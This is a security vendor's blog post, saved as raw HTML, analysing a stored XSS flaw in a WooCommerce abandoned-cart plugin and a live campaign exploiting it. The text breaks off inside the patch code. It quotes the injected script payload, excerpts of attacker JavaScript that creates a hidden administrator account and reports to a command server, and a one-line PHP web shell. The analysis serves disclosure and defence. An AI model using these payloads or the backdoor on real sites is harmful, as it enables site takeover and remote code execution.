<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
			<script>var wfDisabledCookies = "analytical,targeting";</script>	<!-- Google Tag Manager -->
	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer',"GTM-K9CP2C8");</script>
	<!-- End Google Tag Manager -->
	
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- CSRF Token -->
	<meta name="csrf-token" content="ReadOnly">

	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	
	<!-- This site is optimized with the Yoast SEO plugin v24.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<link rel="canonical" href="https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers" />
	<meta property="og:description" content="Last month, a stored cross-site scripting (XSS) flaw was patched in version 5.2.0 of the popular WordPress plugin Abandoned Cart Lite For WooCommerce. The plugin, which we&#8217;ll be referring to by its slugÂ woocommerce-abandoned-cart, allows the owners of WooCommerce sites to track abandoned shopping carts in order to recover those sales. A lack of sanitation on ...Read More" />
	<meta property="og:url" content="https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/" />
	<meta property="og:site_name" content="Wordfence" />
	<meta property="article:publisher" content="https://www.facebook.com/wordfence" />
	<meta property="article:published_time" content="2019-03-11T18:02:46+00:00" />
	<meta property="article:modified_time" content="2019-03-11T20:07:53+00:00" />
	<meta property="og:image" content="https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png" />
	<meta property="og:image:width" content="1200" />
	<meta property="og:image:height" content="628" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="Wordfence Author" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@wordfence" />
	<meta name="twitter:site" content="@wordfence" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="Wordfence Author" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="10 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#article","isPartOf":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/"},"author":{"name":"Wordfence Author","@id":"https://www.wordfence.com/#/schema/person/39fedebdc2ddf000611e4f46a5c4c093"},"headline":"XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers","datePublished":"2019-03-11T18:02:46+00:00","dateModified":"2019-03-11T20:07:53+00:00","mainEntityOfPage":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/"},"wordCount":1927,"publisher":{"@id":"https://www.wordfence.com/#organization"},"image":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#primaryimage"},"thumbnailUrl":"https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png","articleSection":["Research","Vulnerabilities","WordPress Security"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/","url":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/","name":"XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers","isPartOf":{"@id":"https://www.wordfence.com/#website"},"primaryImageOfPage":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#primaryimage"},"image":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#primaryimage"},"thumbnailUrl":"https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png","datePublished":"2019-03-11T18:02:46+00:00","dateModified":"2019-03-11T20:07:53+00:00","breadcrumb":{"@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#primaryimage","url":"https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png","contentUrl":"https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png","width":1200,"height":628},{"@type":"BreadcrumbList","@id":"https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.wordfence.com/"},{"@type":"ListItem","position":2,"name":"Blog","item":"https://www.wordfence.com/blog/"},{"@type":"ListItem","position":3,"name":"XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers"}]},{"@type":"WebSite","@id":"https://www.wordfence.com/#website","url":"https://www.wordfence.com/","name":"Wordfence","description":"WordPress Security Plugin","publisher":{"@id":"https://www.wordfence.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.wordfence.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://www.wordfence.com/#organization","name":"Wordfence","url":"https://www.wordfence.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.wordfence.com/#/schema/logo/image/","url":"https://www.wordfence.com/wp-content/uploads/2015/07/250stacked.png","contentUrl":"https://www.wordfence.com/wp-content/uploads/2015/07/250stacked.png","width":250,"height":250,"caption":"Wordfence"},"image":{"@id":"https://www.wordfence.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/wordfence","https://x.com/wordfence","https://www.instagram.com/wordfence/","https://www.pinterest.com/wordfence/","https://www.youtube.com/channel/UChUNbUrIUgvLpzXJrGHhOPA"]},{"@type":"Person","@id":"https://www.wordfence.com/#/schema/person/39fedebdc2ddf000611e4f46a5c4c093","name":"Wordfence Author","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.wordfence.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/d46b866dba15e07748d03fe68187c62c?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/d46b866dba15e07748d03fe68187c62c?s=96&d=mm&r=g","caption":"Wordfence Author"},"url":"https://www.wordfence.com/blog/author/wfauthor/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' />
<link rel="alternate" type="application/rss+xml" title="Wordfence &raquo; XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers Comments Feed" href="https://www.wordfence.com/blog/2019/03/xss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers/feed/" />
<link rel='stylesheet' id='wp-block-library-css' href='https://www.wordfence.com/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='safe-svg-svg-icon-style-inline-css' type='text/css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='fm_social_share-css' href='https://www.wordfence.com/wp-content/plugins/fm-social-share/css/style.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='wordfence-metrics-css' href='https://www.wordfence.com/wp-content/plugins/wordfence-metrics/css/wordfence-metrics.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-css' href='https://www.wordfence.com/wp-content/themes/wordfence2020/css/googlefonts.css' type='text/css' media='all' />
<link rel='stylesheet' id='ionicons-css' href='https://www.wordfence.com/wp-content/themes/wordfence2020/css/ionicons.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='stylesheet-css' href='https://www.wordfence.com/wp-content/themes/wordfence2020/style.css?ver=1736280594' type='text/css' media='all' />
<link rel='stylesheet' id='laravel-css-css' href='https://www.wordfence.com/css/wordpress.css?id=6d4b9edbc1865faed09e' type='text/css' media='all' />
<script type='text/javascript' src='https://www.wordfence.com/wp-admin/load-scripts.php?c=0&amp;load%5Bchunk_0%5D=jquery-core,jquery-migrate&amp;ver=6.7.1'></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/themes/wordfence2020/js/vendor/modernizr-2.8.3.min.js" id="modernizr-js"></script>
<link rel="https://api.w.org/" href="https://www.wordfence.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.wordfence.com/wp-json/wp/v2/posts/21418" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.wordfence.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel='shortlink' href='https://www.wordfence.com/?p=21418' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.wordfence.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2019%2F03%2Fxss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.wordfence.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2019%2F03%2Fxss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers%2F&#038;format=xml" />
		<style type="text/css" id="wp-custom-css">
			.alignleft{
	padding-right: 10px;	
}		</style>
		</head>
<body class="post-template-default single single-post postid-21418 single-format-standard" >
<div id="app-wrapper">
<site-header-cart-bar :logged-in="loggedIn"></site-header-cart-bar>
<site-header :logged-in="loggedIn"></site-header>
<section class="blog-post-header">
	<div class="container blog-post-featured-image">
		<div class="row">
			<div class="col px-0 ">
				<img width="1200" height="628" src="https://www.wordfence.com/wp-content/uploads/2019/03/abandoned-cart-featured.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" />			</div>
		</div>
	</div>
	<div class="container blog-post-metadata">
		<div class="row">
			<div class="col blog-post-author">
				<a href="https://www.wordfence.com/blog/author/wfauthor/"><img alt='' src='https://secure.gravatar.com/avatar/d46b866dba15e07748d03fe68187c62c?s=80&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d46b866dba15e07748d03fe68187c62c?s=160&#038;d=mm&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' decoding='async'/><span class="blog-post-author-name">Wordfence Author</span></a>
			</div>
			<div class="col blog-post-date">
				March 11, 2019			</div>
		</div>
	</div>
</section>
<section class="blog-post-content">
    <div class="container">
        <div class="row mb-5 mb-lg-3">
            <div class="col-12 col-lg-8">
                <h1>XSS Vulnerability in Abandoned Cart Plugin Leads To WordPress Site Takeovers</h1>
                <p>Last month, a stored cross-site scripting (XSS) flaw was patched in version 5.2.0 of the popular WordPress plugin <a href="https://wordpress.org/plugins/woocommerce-abandoned-cart/#developers" target="_blank" rel="noopener">Abandoned Cart Lite For WooCommerce</a>. The plugin, which we&#8217;ll be referring to by its slugÂ <code>woocommerce-abandoned-cart</code>, allows the owners of WooCommerce sites to track abandoned shopping carts in order to recover those sales. A lack of sanitation on both input and output allows attackers to inject malicious JavaScript payloads into various data fields, which will execute when a logged-in user with administrator privileges views the list of abandoned carts from their WordPress dashboard.</p>
<p>At this time, any WordPress sites making use of <code>woocommerce-abandoned-cart</code>, or its premium version, <code>woocommerce-abandoned-cart-pro</code>, are advised to update to the latest available version as soon as possible. Sites making use of the Wordfence WAF, both free and premium, are protected from the attacks detailed in this post due to the firewall&#8217;s built-in XSS protection. Affected users without Wordfence installed should consider a <a href="https://www.wordfence.com/site-security-audit/" target="_blank" rel="noopener">Site Security Audit</a>Â to confirm the integrity of their WordPress sites.</p>
<p>In today&#8217;s post, we&#8217;ll take a look at the details of this vulnerability, how attackers are exploiting it in the wild to take over sites, and what site owners should do if they believe they&#8217;ve been attacked.</p>
<h2>XSS Vulnerability In Detail</h2>
<p>The guest-input side of <code>woocommerce-abandoned-cart</code>Â begins when an unauthenticated user builds a shopping cart and begins the checkout process.</p>
<div id="attachment_21457" style="width: 680px" class="wp-caption aligncenter"><a href="https://www.wordfence.com/wp-content/uploads/2019/03/dummydata.png"><img decoding="async" aria-describedby="caption-attachment-21457" class="size-full wp-image-21457" src="https://www.wordfence.com/wp-content/uploads/2019/03/dummydata.png" alt="" width="670" height="450" /></a><p id="caption-attachment-21457" class="wp-caption-text">An example of the Billing Details page on a basic WooCommerce site. This data is stored by woocommerce-abandoned-cart in case checkout isn&#8217;t completed.</p></div>
<p>With the plugin active, all of the data input by the guest is sent back to the plugin using theÂ <code>save_data</code> AJAX action. The intent is if the checkout process is not completed, whether the page was navigated away from, or the browser closed, or the shopper just got distracted, the plugin can inform the shop&#8217;s owners within their dashboard.</p>
<pre class="brush: php; first-line: 69; title: ; notranslate" title="">function save_data() {
      if ( ! is_user_logged_in() ) {
          global $wpdb, $woocommerce;    
          if ( isset($_POST&#x5B;'billing_first_name']) &amp;&amp; $_POST&#x5B;'billing_first_name'] != '' ){
              wcal_common::wcal_set_cart_session( 'billing_first_name', $_POST&#x5B;'billing_first_name'] );
          }
          if ( isset($_POST&#x5B;'billing_last_name']) &amp;&amp; $_POST&#x5B;'billing_last_name'] != '' ) {
              wcal_common::wcal_set_cart_session( 'billing_last_name', $_POST&#x5B;'billing_last_name'] );
          }            
          if ( isset($_POST&#x5B;'billing_company']) &amp;&amp; $_POST&#x5B;'billing_company'] != '' ) {
              wcal_common::wcal_set_cart_session( 'billing_company', $_POST&#x5B;'billing_company'] );
          }   </pre>
<p>However, the function used to handle these AJAX requests fails to perform any input sanitization on the various <code>$_POST</code> fields it receives. As shown in the above snippet, shopper data fields likeÂ <code>billing_first_name</code>,Â <code>billing_last_name</code>, andÂ <code>billing_company</code>Â are stored directly as they were received.Â The data pulled from this request is stored in the WordPress database, and can be accessed by an administrator from their dashboard. There, they can view the individual carts, their customer information, and order totals.</p>
<div id="attachment_21458" style="width: 1115px" class="wp-caption aligncenter"><a href="https://www.wordfence.com/wp-content/uploads/2019/03/abandonedcart.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-21458" class="size-full wp-image-21458" src="https://www.wordfence.com/wp-content/uploads/2019/03/abandonedcart.png" alt="" width="1105" height="417" /></a><p id="caption-attachment-21458" class="wp-caption-text">An abandoned cart, patiently waiting to be recovered.</p></div>
<p>When this data is rendered in the administrator&#8217;s browser, no output sanitization takes place either. Particularly,Â <code>billing_first_name</code> andÂ <code>billing_last_name</code> are concatenated into a single &#8220;Customer&#8221; field in the output table. This field is what hackers are targeting in active campaigns against this flaw.</p>
<h2>Malicious JavaScript Hijacking Admin Sessions</h2>
<p>The attacks on this vulnerability have been consistent in their execution. The attacker builds a cart, supplies bogus contact information, and abandons the cart. The names and emails are random, but the requests follow the same pattern: the generated first and last name are supplied together asÂ <code>billing_first_name</code>, but theÂ <code>billing_last_name</code> field contains the injected payloadÂ <code>&lt;script src=hXXps://bit[.]ly/2SzpVBY&gt;&lt;/script&gt;</code>.</p>
<p>Malware campaigns making use of URL shortening services like bit.ly are common. In addition to providing a basic layer of abstraction between the malicious request and the actual URL of the script, the shorter addresses make it easier to beat string length restrictions (especially when bypass techniques are employed, which isn&#8217;t the case in this scenario). Not only that, but if the domain at the other end of the URL shortener is taken down, the attacker can just point the bit.ly address at a new domain and keep all of their previous injections alive.</p>
<p>In this case, the bit.ly address resolves toÂ <code>hXXps://cdn-bigcommerce[.]com/visionstat.js</code>. The domain, which attempts to look innocuous by impersonating the legitimateÂ <code>cdn.bigcommerce.com</code>, points to the command and control (C2) server behind the infection. The target script,Â <code>visionstat.js</code>, is a malicious JavaScript payload which uses the victim&#8217;s own browser session to deploy backdoors on their site. Two backdoors are deployed: a rogue administrator account is created, and a deactivated plugin is infected with a code execution script. Both actions are executed by creating a hidden iframe in the admin&#8217;s existing browser window, then simulating the process of filling out and submitting the necessary forms within it.</p>
<pre class="brush: jscript; first-line: 311; title: ; notranslate" title="">function processNewUser(adminhref){
	var username = 'woouser';
	var email = 'woouser401a@mailinator.com';
	var password = 'K1YPRka7b0av1B';
	
	pfr=document.createElement('iframe');
	pfr.style.visibility='hidden';
	pfr.name='pfr';
	pfr.src=adminhref+'/user-new.php';</pre>
<p>In the first backdoor, a hidden iframe is created which opens the new user creation form. This form is filled out with the information from the first few lines of the function seen above, with a username of &#8220;woouser&#8221;Â and an email address at Mailinator, a popular disposable inbox provider. The user is given the Administrator role, and the account is created.</p>
<p>When this new user is created, the attacker is notified in two ways. First, theÂ <code>visionstat.js</code>Â payload makes an AJAX call toÂ <code>hXXps://cdn-bigcommerce[.]com/counterstat.php</code>Â to phone home to its C2 with the URL of the compromised site. Second, the WordPress application running on the site will generate a new user notification email, which is sent to the Mailinator inbox associated with the rogue administrator account.</p>
<pre class="brush: jscript; first-line: 422; title: ; notranslate" title="">for (var at = 0; at &lt; fl.length; at++) {
	try{
		if(fl&#x5B;at].href.indexOf('action=activate&amp;plugin=')&gt;0){
			funcURL = fl&#x5B;at].href.match(/action=activate&amp;plugin=(&#x5B;^&amp;]+)/)&#x5B;1];

			//console.log(funcURL);
			break;
		}
	}catch(e){
	}
}
//console.log(funcURL);
if (funcURL == '')
{
	maindata.details = &quot;Error: No disabled plugins!&quot;;
	SendData(maindata);
}
else
{
	maindata.details = &quot;Found disabled plugin (&quot; + funcURL + &quot;)&quot;;
	SendData(maindata);
	processPluginEdit(adminhref, pfr1, funcURL);
}</pre>
<p>For the second backdoor,Â <code>visionstat.js</code> opens another hidden iframe, this time to the site&#8217;s Plugins menu. There, it scans the list of installed plugins for an &#8220;Activate&#8221; link, which signifies an inactive plugin is present. Then, new content is injected into the inactive plugin, containing a simple PHP backdoor script.</p>
<pre class="brush: php; title: ; notranslate" title="">&lt;?php @extract($_REQUEST);@die($cdate($adate));</pre>
<p>By sending a POST request to this script containing a PHP function as theÂ <code>cdate</code>Â parameter, and an argument for that function asÂ <code>adate</code>, they are able to perform a variety of actions, from executing arbitrary PHP code to running system commands on the compromised server.Â As with the creation of a rogue administrator,Â <code>visionstat.js</code> also phones home to the C2 server to inform the attacker that this backdoor was successfully deployed.</p>
<h2>Plugin Vendor Deploys Unique Patch</h2>
<p>Tyche Softwares, the plugin&#8217;s vendor, was made aware of the vulnerability via user reports on the WordPress.org forums. A patch was quickly released, and a security notice was posted in the plugin&#8217;s changelog. The patched version of the plugin applies WordPress&#8217;s built-in <code>sanitize_text_field</code> function to prevent the injection of new scripts.</p>
<pre class="brush: php; first-line: 1400; title: ; notranslate" title="">            if ( 'yes' !== get_option( 'ac_lite_user_cleanup' ) ) {
                $query_cleanup = &quot;UPDATE `&quot;.$wpdb-&gt;prefix.&quot;ac_guest_abandoned_cart_history_lite` SET 
                    billing_first_name = IF (billing_first_name LIKE '%&lt;%', '', billing_first_name),
                    billing_last_name = IF (billing_last_name LIKE '%&lt;%', '', billing_last_name),
                    billing_company_name = IF (billing_company_name LIKE '%&lt;%', '', billing_company_name),
                    billing_address_1 = IF (billing_address_1 LIKE '%&lt;%', '', billing_address_1),
